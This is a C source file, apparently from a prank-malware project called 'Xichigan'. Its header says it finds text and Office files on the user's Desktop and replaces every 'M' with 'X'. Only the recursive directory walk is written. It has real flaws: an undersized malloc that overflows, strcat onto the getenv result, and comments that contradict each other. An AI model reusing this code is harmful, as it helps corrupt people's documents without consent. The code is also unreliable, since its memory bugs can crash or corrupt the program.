#include "Xichigan.h"

/*********************************************************************************
* Author: Laine Rumreich								       				 				   *
*																				 							*
*																				 							*
* Called from: main.c										 					 					*
*																				 							*
* Functions to search for text (including Microsoft Office) files on the desktop *
* of the current user, opens them, and replaces every ‘M’ or ‘m’ with ‘X’        *
**********************************************************************************/

// Determine if the filepath 'path' is a directory; return 1 if it is a directory, 0 otherwise
int isDir(const char* path) {
    struct stat buf;
    stat(path, &buf);
    return S_ISDIR(buf.st_mode);
}

// Search (spider) through all of the files on the Desktop and any subdirectories
void spiderDirectory(char *homeDir, DIR *d){
	struct dirent *dir;
	DIR *currentD;
	char *currentDir = malloc(sizeof(homeDir));

	// Loop until there are no more subdirectories
	while ((dir = readdir(d)) != NULL)
	{
		strcpy(currentDir, homeDir);
		strcat(currentDir,"/");
		strcat(currentDir,dir->d_name);

		if(strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0 && isDir(currentDir)){
			currentD = opendir(currentDir);
			if (currentD)
			{
				spiderDirectory(currentDir, currentD);
				closedir(currentD);
			}
		}

		// If the current item in the directory is a .txt, .doc, or .docx, run X to M on it
		printf("%s\n", dir->d_name);
	}

}

void XtoM() {
	DIR *d;
	char *homedir = getenv("HOME");

	// Get the Desktop path if user is using Linux
	strcat(homedir,"/Desktop");

	// TODO: Get Desktop path if user is using Windows/iOS

	d = opendir(homedir);
	if (d)
	{
		spiderDirectory(homedir, d);
		closedir(d);
	}

}

